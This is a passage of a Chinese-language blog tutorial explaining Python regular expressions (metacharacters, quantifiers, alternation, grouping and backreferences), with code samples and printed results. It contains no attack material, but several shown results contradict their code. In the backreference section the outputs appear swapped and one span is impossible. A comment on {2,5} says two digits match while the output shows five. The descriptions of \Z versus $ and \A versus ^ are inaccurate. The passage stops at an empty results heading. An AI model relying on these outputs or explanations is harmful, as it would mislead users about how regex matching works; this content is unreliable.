<td align="left">匹配 0 个或 1 个前面的正则表达式定义的片段(非贪婪方式)</td>
</tr>
<tr>
<td align="left">{n}</td>
<td align="left">精确匹配 <code>n</code> 个前面的表达式</td>
</tr>
<tr>
<td align="left">a|b</td>
<td align="left">匹配 <code>a</code> 或 <code>b</code></td>
</tr>
<tr>
<td align="left">( )</td>
<td align="left">匹配括号内的表达式，也表示一个组</td>
</tr>
<tr>
<td align="left">\</td>
<td align="left">转义符</td>
</tr>
</tbody></table>
<h2 id="全部的实测"><a href="#全部的实测" class="headerlink" title="全部的实测"></a>全部的实测</h2><h3 id="匹配任意一个字符"><a href="#匹配任意一个字符" class="headerlink" title=".匹配任意一个字符"></a><code>.</code>匹配任意一个字符</h3><p>这个点<code>.</code>就相当于如何字符</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">a=<span class="string">&#x27;abc&#x27;</span></span><br><span class="line">c=re.match(<span class="string">&#x27;.&#x27;</span>,a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出对象</span></span><br><span class="line">print(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出被匹配的内容</span></span><br><span class="line">print(c.group())</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;re.Match object; span&#x3D;(0, 1), match&#x3D;&#39;a&#39;&gt;</span><br><span class="line">a</span><br></pre></td></tr></table></figure>




<h3 id="匹配列表中的内容"><a href="#匹配列表中的内容" class="headerlink" title="[]匹配列表中的内容"></a><code>[]</code>匹配列表中的内容</h3><div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>这个<code>[]</code>匹配列表中的内容，比如<code>[15]</code>就是只匹配<code>1</code>和<code>5</code>，要是<code>[1-5]</code>就是只匹配<code>1</code>到<code>5</code>，如果是<code>[a-z]</code>就是匹配到a到z</p>
</div> 

<p>可以看到他只匹配<code>1</code>到<code>5</code></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210420074431747.png" alt="image-20210420074431747"></p>
<p>代码测试</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">a=<span class="string">&#x27;4&#x27;</span></span><br><span class="line"></span><br><span class="line">c=re.match(<span class="string">&#x27;[1-5]&#x27;</span>,a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出对象</span></span><br><span class="line">print(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出被匹配的内容</span></span><br><span class="line">print(c.group())</span><br></pre></td></tr></table></figure>
<p>结果：匹配1到5到的数字4也是这个范围的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;re.Match object; span&#x3D;(0, 1), match&#x3D;&#39;4&#39;&gt;</span><br><span class="line">4</span><br></pre></td></tr></table></figure>


<h3 id="w匹配匹配字母数字下划线"><a href="#w匹配匹配字母数字下划线" class="headerlink" title="\w匹配匹配字母数字下划线"></a><code>\w</code>匹配匹配字母数字下划线</h3><div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>演示可以看见数字和字母都可以匹配到</p>
</div> 



<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210420081022642.png" alt="image-20210420081022642"></p>
<p>代码测试</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">a=<span class="string">&#x27;a1&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 应为这个函数只能一个一个的匹配我这个就用到了两个\w</span></span><br><span class="line">c=re.match(<span class="string">&#x27;\w\w&#x27;</span>,a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出对象</span></span><br><span class="line">print(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出被匹配的内容</span></span><br><span class="line">print(c.group())</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;re.Match object; span&#x3D;(0, 2), match&#x3D;&#39;a1&#39;&gt;</span><br><span class="line">a1</span><br></pre></td></tr></table></figure>
<h3 id="W匹配不是字母数字下划线"><a href="#W匹配不是字母数字下划线" class="headerlink" title="\W匹配不是字母数字下划线"></a><code>\W</code>匹配不是字母数字下划线</h3><div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>可以看见下面字符都是可以匹配的，他是和小写的<code>\w</code>是对立的</p>
</div> 



<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210421081511484.png" alt="image-20210421081511484"></p>
<h3 id="s匹配任意空白字符"><a href="#s匹配任意空白字符" class="headerlink" title="\s匹配任意空白字符"></a><code>\s</code>匹配任意空白字符</h3><div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p><code>\s</code>匹配任意空白字符匹配任意空白字符，等价于 <code>[\\t\\n\\r\\f]</code></p>
</div> 

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210421081811687.png" alt="image-20210421081811687"></p>
<h3 id="S匹配任意非空字符"><a href="#S匹配任意非空字符" class="headerlink" title="\S匹配任意非空字符"></a><code>\S</code>匹配任意非空字符</h3><div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>这个只要不是空就匹配上和小写的<code>\s</code>是对立的</p>
</div> 



<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210421081915172.png" alt="image-20210421081915172"></p>
<h3 id="d匹配任意数字"><a href="#d匹配任意数字" class="headerlink" title="\d匹配任意数字"></a><code>\d</code>匹配任意数字</h3><div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p><code>\d</code>匹配任意数字，等价于 <code>[0-9]</code></p>
</div> 

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210421082203149.png" alt="image-20210421082203149"></p>
<h3 id="D匹配任意非数字的字符"><a href="#D匹配任意非数字的字符" class="headerlink" title="\D匹配任意非数字的字符"></a><code>\D</code>匹配任意非数字的字符</h3><div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>他是和小写的<code>\d</code>是对立的</p>
</div> 

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210421082319941.png" alt="image-20210421082319941"></p>
<h3 id="Z匹配字符串结尾"><a href="#Z匹配字符串结尾" class="headerlink" title="\Z匹配字符串结尾"></a><code>\Z</code>匹配字符串结尾</h3><div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>这个<code>\Z</code>是和<code>$</code>有差别的</p>
</div> 

<ul>
<li><code>\Z</code>匹配字符串结尾，如果他匹配到换行符也会跟着换行符往下匹配</li>
<li><code>$</code>只会匹配到换行符前的</li>
</ul>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210421085745512.png" alt="image-20210421085745512"></p>
<h3 id="A匹配字符串开头"><a href="#A匹配字符串开头" class="headerlink" title="\A匹配字符串开头"></a><code>\A</code>匹配字符串开头</h3><div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>这个<code>\A</code>和<code>^</code>差不多</p>
</div> 

<ul>
<li><code>^</code>是匹配一行字符串的开头</li>
<li><code>\A</code>匹配字符串开头</li>
</ul>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210421082918321.png" alt="image-20210421082918321"></p>
<p>代码测试</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span>  re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a=<span class="string">&#x27;aaabbbccc&#x27;</span></span><br><span class="line"></span><br><span class="line">c=re.match(<span class="string">&#x27;\Aaaa&#x27;</span>,a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出对象</span></span><br><span class="line">print(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出被匹配的内容</span></span><br><span class="line">print(c.group())</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;re.Match object; span&#x3D;(0, 3), match&#x3D;&#39;aaa&#39;&gt;</span><br><span class="line">aaa</span><br></pre></td></tr></table></figure>
<h3 id="匹配一行字符串的开头"><a href="#匹配一行字符串的开头" class="headerlink" title="^匹配一行字符串的开头"></a><code>^</code>匹配一行字符串的开头</h3><div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>这个<code>\A</code>和<code>^</code>差不多</p>
</div> 

<ul>
<li><code>^</code>是匹配一行字符串的开头</li>
<li><code>\A</code>匹配多行字符串开头</li>
</ul>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210421091657333.png" alt="image-20210421091657333"></p>
<h3 id="匹配一行字符串的结尾"><a href="#匹配一行字符串的结尾" class="headerlink" title="$匹配一行字符串的结尾"></a><code>$</code>匹配一行字符串的结尾</h3><div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>他和^是对立的</p>
</div> 

<div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>这个<code>\Z</code>是和<code>$</code>有差别的</p>
</div> 

<ul>
<li><code>\Z</code>匹配字符串结尾，如果他匹配到换行符也会跟着换行符往下匹配</li>
<li><code>$</code>只会匹配到换行符前的</li>
</ul>
<p><img src= "/img/loading2.gif" data-lazy-src="/home/zss/.config/Typora/typora-user-images/image-20210421091914804.png" alt="image-20210421091914804"></p>
<h3 id="n匹配换行符"><a href="#n匹配换行符" class="headerlink" title="\n匹配换行符"></a><code>\n</code>匹配换行符</h3><p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210421172308336.png" alt="image-20210421172308336"></p>
<p>代码演示</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">pattern=<span class="string">&#x27;蔡徐坤 135000000\n01 18岁&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出pattern变量的结果</span></span><br><span class="line">print(pattern)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 匹配换行符</span></span><br><span class="line">x =re.findall(<span class="string">&#x27;\n&#x27;</span>,pattern)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">蔡徐坤 135000000  </span><br><span class="line">01 18岁   # 可以看见换行了</span><br><span class="line">[&#39;\n&#39;]	  # 匹配到了换行符</span><br></pre></td></tr></table></figure>
<h3 id="t匹配制表符"><a href="#t匹配制表符" class="headerlink" title="\t匹配制表符"></a><code>\t</code>匹配制表符</h3><p>这个演示不了 </p>
<h3 id="匹配0个或多个"><a href="#匹配0个或多个" class="headerlink" title="*匹配0个或多个"></a><code>*</code>匹配0个或多个</h3><div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>他<code>*</code>和<code>+</code>差不多</p>
</div> 
<ul>
<li><code>*</code>匹配0个或n个 ，如果一个没有匹配到也不会返回None</li>
<li><code>+</code>匹配1个或n个，如果一个都没有匹配到他就会返还None</li>
</ul>
<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">pattern=<span class="string">&#x27;aaaaaaa&#x27;</span></span><br><span class="line"><span class="comment"># 匹配一个a</span></span><br><span class="line">x =re.match(<span class="string">&#x27;a&#x27;</span>,pattern)</span><br><span class="line"><span class="comment"># 输出匹配的结果</span></span><br><span class="line">print(x.group())</span><br></pre></td></tr></table></figure>
<p>结果：可以看见他就匹配一个a</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a</span><br></pre></td></tr></table></figure>
<p>如果我添加一个*那就可以叫后面的a都匹配上</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">pattern=<span class="string">&#x27;aaaaaaa&#x27;</span></span><br><span class="line"><span class="comment"># 匹配后面全部的a</span></span><br><span class="line">x =re.match(<span class="string">&#x27;a*&#x27;</span>,pattern)</span><br><span class="line"><span class="comment"># 输出匹配的结果</span></span><br><span class="line">print(x.group())</span><br></pre></td></tr></table></figure>
<p>结果：可以看见后面的a都匹配上了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aaaaaaa</span><br></pre></td></tr></table></figure>
<div class="note info simple"><p>如果我有个不匹配也不会返回None</p>
</div>

<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">pattern=<span class="string">&#x27;aaaaaaa&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 匹配一个没有的b</span></span><br><span class="line">x =re.match(<span class="string">&#x27;b*&#x27;</span>,pattern)</span><br><span class="line"></span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure>
<p>结果：他结果并没有返回None</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;re.Match object; span&#x3D;(0, 0), match&#x3D;&#39;&#39;&gt;</span><br></pre></td></tr></table></figure>


<h3 id="匹配1个或多个"><a href="#匹配1个或多个" class="headerlink" title="+匹配1个或多个"></a><code>+</code>匹配1个或多个</h3><div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>他<code>*</code>和<code>+</code>差不多</p>
</div> 
<ul>
<li><code>*</code>匹配0个或n个 ，如果一个没有匹配到也不会返回None</li>
<li><code>+</code>匹配1个或n个，如果一个都没有匹配到他就会返还None</li>
</ul>
<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">pattern=<span class="string">&#x27;aaaaaaa&#x27;</span></span><br><span class="line"><span class="comment"># 匹配一个a</span></span><br><span class="line">x =re.match(<span class="string">&#x27;a&#x27;</span>,pattern)</span><br><span class="line"><span class="comment"># 输出匹配的结果</span></span><br><span class="line">print(x.group())</span><br></pre></td></tr></table></figure>
<p>结果：可以看见他就匹配一个a</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a</span><br></pre></td></tr></table></figure>
<p>如果我添加一个*那就可以叫后面的a都匹配上</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">pattern=<span class="string">&#x27;aaaaaaa&#x27;</span></span><br><span class="line"><span class="comment"># 匹配后面全部的a</span></span><br><span class="line">x =re.match(<span class="string">&#x27;a+&#x27;</span>,pattern)</span><br><span class="line"><span class="comment"># 输出匹配的结果</span></span><br><span class="line">print(x.group())</span><br></pre></td></tr></table></figure>
<p>结果：可以看见后面的a都匹配上了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aaaaaaa</span><br></pre></td></tr></table></figure>
<div class="note info simple"><p>如果我有个不匹配就会返还None</p>
</div>

<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">pattern=<span class="string">&#x27;aaaaaaa&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 匹配一个没有的b</span></span><br><span class="line">x =re.match(<span class="string">&#x27;b+&#x27;</span>,pattern)</span><br><span class="line"></span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">None</span><br></pre></td></tr></table></figure>
<h3 id="匹配-0-个或-1-个"><a href="#匹配-0-个或-1-个" class="headerlink" title="?匹配 0 个或 1 个"></a><code>?</code>匹配 0 个或 1 个</h3><div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>在一个<code>?</code>他不是贪婪模式，他是前面的正则表达式定义的片段</p>
</div> 

<div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>?他是匹配 0 个或 1 个，如果匹配不到也不会返回None</p>
</div> 

<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">pattern=<span class="string">&#x27;abcdef12121212&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 匹配一个存在的</span></span><br><span class="line">x =re.match(<span class="string">&#x27;a?&#x27;</span>,pattern)</span><br><span class="line"></span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure>
<p>结果：返回他匹配到的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;re.Match object; span&#x3D;(0, 1), match&#x3D;&#39;a&#39;&gt;</span><br></pre></td></tr></table></figure>
<div class="note info simple"><p>我让他匹配一个没有的他也不会返回None</p>
</div>

<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">pattern=<span class="string">&#x27;bcdef12121212&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 匹配一个不存在的</span></span><br><span class="line">x =re.match(<span class="string">&#x27;a?&#x27;</span>,pattern)</span><br><span class="line"></span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure>
<p>代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;re.Match object; span&#x3D;(0, 1), match&#x3D;&#39;&#39;&gt;</span><br></pre></td></tr></table></figure>
<p>如果我不添加<code>?</code>程序就返回None</p>
<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">pattern=<span class="string">&#x27;bcdef12121212&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 匹配一个不存在的</span></span><br><span class="line">x =re.match(<span class="string">&#x27;a&#x27;</span>,pattern)</span><br><span class="line"></span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">None</span><br></pre></td></tr></table></figure>


<h3 id="n-匹配自己指定次数"><a href="#n-匹配自己指定次数" class="headerlink" title="{n}匹配自己指定次数"></a><code>&#123;n&#125;</code>匹配自己指定次数</h3><ol>
<li><p>测试指定指定次数</p>
<p>指定匹配多少</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">pattern=<span class="string">&#x27;12121212bcdef&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 匹配3个数字</span></span><br><span class="line">x =re.match(<span class="string">&#x27;\d&#123;3&#125;&#x27;</span>,pattern)</span><br><span class="line"></span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure>
<p>结果：可以看见他匹配了三个</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;re.Match object; span&#x3D;(0, 3), match&#x3D;&#39;121&#39;&gt;</span><br></pre></td></tr></table></figure></li>
<li><p>指定匹配范围</p>
<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">pattern=<span class="string">&#x27;12121212bcdef&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 匹配2-5个数字</span></span><br><span class="line">x =re.match(<span class="string">&#x27;\d&#123;2,5&#125;&#x27;</span>,pattern)</span><br><span class="line"></span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure>
<p>结果：应为他都是按照最多进行匹配所以会匹配到2个</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;re.Match object; span&#x3D;(0, 5), match&#x3D;&#39;12121&#39;&gt;</span><br></pre></td></tr></table></figure></li>
<li><p>匹配最少多几个</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">pattern=<span class="string">&#x27;12121212bcdef&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 匹配最少2个数字，最多不限制</span></span><br><span class="line">x =re.match(<span class="string">&#x27;\d&#123;2,&#125;&#x27;</span>,pattern)</span><br><span class="line"></span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure>
<p>结果：应该<code>,</code>后面不添加就是无限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;re.Match object; span&#x3D;(0, 8), match&#x3D;&#39;12121212&#39;&gt;</span><br></pre></td></tr></table></figure>




</li>
</ol>
<h3 id="a-b匹配-a-或-b"><a href="#a-b匹配-a-或-b" class="headerlink" title="a|b匹配 a 或 b"></a><code>a|b</code>匹配 <code>a</code> 或 <code>b</code></h3><div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>比如我们想执行匹配w和m那就可以用到<code>|</code>符号了</p>
</div> 

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">pattern=<span class="string">&#x27;wdsadasdsa&#x27;</span></span><br><span class="line"><span class="comment"># 匹配第一个字符w或者m</span></span><br><span class="line">x =re.match(<span class="string">&#x27;w|m&#x27;</span>,pattern)</span><br><span class="line"></span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;re.Match object; span&#x3D;(0, 1), match&#x3D;&#39;w&#39;&gt;</span><br></pre></td></tr></table></figure>


<h3 id="分组"><a href="#分组" class="headerlink" title="( )分组"></a><code>( )</code>分组</h3><p>学习网址<a href="https://www.bilibili.com/video/BV1N64y1u7Ty?p=10">https://www.bilibili.com/video/BV1N64y1u7Ty?p=10</a></p>
<h4 id="基本分组"><a href="#基本分组" class="headerlink" title="基本分组"></a>基本分组</h4><div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>什么是分组，比如我们匹配一个字符串他只能匹配输出一组，我们可以用<code>()</code>进行分组</p>
</div> 

<p><strong>演示</strong></p>
<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">pattern=<span class="string">&#x27;zhao:2737977997&#x27;</span></span><br><span class="line"></span><br><span class="line">x =re.match(<span class="string">&#x27;\w*:\d*&#x27;</span>,pattern)</span><br><span class="line"></span><br><span class="line">print(x)</span><br><span class="line">print(x.group())</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;re.Match object; span&#x3D;(0, 15), match&#x3D;&#39;zhao:2737977997&#39;&gt;</span><br><span class="line">zhao:2737977997</span><br></pre></td></tr></table></figure>
<div class="note info simple"><p>比如我们想叫<code>zhao</code>和<code>2737977997</code>进行分开我们就可以用<code>()</code>进行分组</p>
</div>

<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">pattern=<span class="string">&#x27;zhao:2737977997&#x27;</span></span><br><span class="line"></span><br><span class="line">x =re.match(<span class="string">&#x27;(\w*):(\d*)&#x27;</span>,pattern)</span><br><span class="line"></span><br><span class="line">print(x)</span><br><span class="line"><span class="comment"># 输出全部分组</span></span><br><span class="line">print(x.groups())</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;re.Match object; span&#x3D;(0, 15), match&#x3D;&#39;zhao:2737977997&#39;&gt;</span><br><span class="line">(&#39;zhao&#39;, &#39;2737977997&#39;)</span><br></pre></td></tr></table></figure>
<div class="note info simple"><p>我们还可以选择要选择输出的分组用<code>group()</code>咧<code>group(1)</code>或者<code>groups()[1]</code></p>
</div>

<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">pattern=<span class="string">&#x27;zhao:2737977997&#x27;</span></span><br><span class="line"></span><br><span class="line">x =re.match(<span class="string">&#x27;(\w*):(\d*)&#x27;</span>,pattern)</span><br><span class="line"></span><br><span class="line">print(x)</span><br><span class="line"><span class="comment"># 用group(1)指定输出分组</span></span><br><span class="line">print(<span class="string">&quot;用group(1)指定输出分组&quot;</span>)</span><br><span class="line">print(x.group(<span class="number">1</span>))</span><br><span class="line">print(x.group(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用groups()[0]指定输出分组</span></span><br><span class="line">print(<span class="string">&quot;用groups()[0]指定输出分组&quot;</span>)</span><br><span class="line">print(x.groups()[<span class="number">0</span>])</span><br><span class="line">print(x.groups()[<span class="number">1</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;re.Match object; span&#x3D;(0, 15), match&#x3D;&#39;zhao:2737977997&#39;&gt;</span><br><span class="line">用group(1)指定输出分组</span><br><span class="line">zhao</span><br><span class="line">2737977997</span><br><span class="line">用groups()[0]指定输出分组</span><br><span class="line">zhao</span><br><span class="line">2737977997</span><br></pre></td></tr></table></figure>
<h4 id="分组引用"><a href="#分组引用" class="headerlink" title="分组引用"></a>分组引用</h4><div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>比如我们想匹配一个<code>HTML</code>代码</p>
</div> 

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">pattern=<span class="string">&#x27;&lt;bead&gt;匹配&lt;/h1&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">x =re.match(<span class="string">&#x27;&lt;.+&gt;.+&lt;/.+&gt;&#x27;</span>,pattern)</span><br><span class="line"></span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;re.Match object; span&#x3D;(0, 28), match&#x3D;&#39;&lt;bead&gt;匹配&lt;&#x2F;bead&gt;&#39;&gt;</span><br></pre></td></tr></table></figure>
<p>上面的代码如果我匹配不同的比如<code>&lt;bead&gt;匹配&lt;/h1&gt;</code>上面的代码他也会被匹配到</p>
<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">pattern=<span class="string">&#x27;&lt;bead&gt;匹配&lt;/h1&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">x =re.match(<span class="string">&#x27;&lt;.+&gt;.+&lt;/.+&gt;&#x27;</span>,pattern)</span><br><span class="line"></span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;re.Match object; span&#x3D;(0, 13), match&#x3D;&#39;&lt;bead&gt;匹配&lt;&#x2F;h1&gt;&#39;&gt;</span><br></pre></td></tr></table></figure>


<div class="note info simple"><p>如果我们只匹配对应的HTML比如<code>&lt;bead&gt;&lt;/bead&gt;</code>这样对应如果不对应就不匹配我们就可以用分组引用</p>
</div>

<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">pattern=<span class="string">&#x27;&lt;bead&gt;匹配&lt;/h1&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># \1就是分组1，我又添加一个防止转义r不让\转义</span></span><br><span class="line">x =re.match(<span class="string">r&#x27;&lt;(.+)&gt;.+&lt;/\1&gt;&#x27;</span>,pattern)</span><br><span class="line"></span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;re.Match object; span&#x3D;(0, 15), match&#x3D;&#39;&lt;bead&gt;匹配&lt;&#x2F;bead&gt;&#39;&gt;</span><br></pre></td></tr></table></figure>
<p>如果我改成</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">pattern=<span class="string">&#x27;&lt;bead&gt;匹配&lt;/bead&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># \1就是分组1，我又添加一个防止转义r不让\转义</span></span><br><span class="line">x =re.match(<span class="string">r&#x27;&lt;(.+)&gt;.+&lt;/\1&gt;&#x27;</span>,pattern)</span><br><span class="line"></span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">None</span><br></pre></td></tr></table></figure>
<h4 id="引用起别名"><a href="#引用起别名" class="headerlink" title="引用起别名"></a>引用起别名</h4><div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>起别名格式<code>(?p&lt;起的名字&gt;表达式)</code></p>
<p>引用<code>(?p=引用的分组名字)</code></p>
</div> 



<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">pattern=<span class="string">&#x27;&lt;bead&gt;匹配&lt;/bead&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 我又添加一个防止转义r不让\转义</span></span><br><span class="line">x =re.match(<span class="string">r&#x27;&lt;(?P&lt;dead&gt;.+)&gt;.+&lt;/*(?P=dead)&gt;&#x27;</span>,pattern)</span><br><span class="line"></span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure>
<p>结果</p>
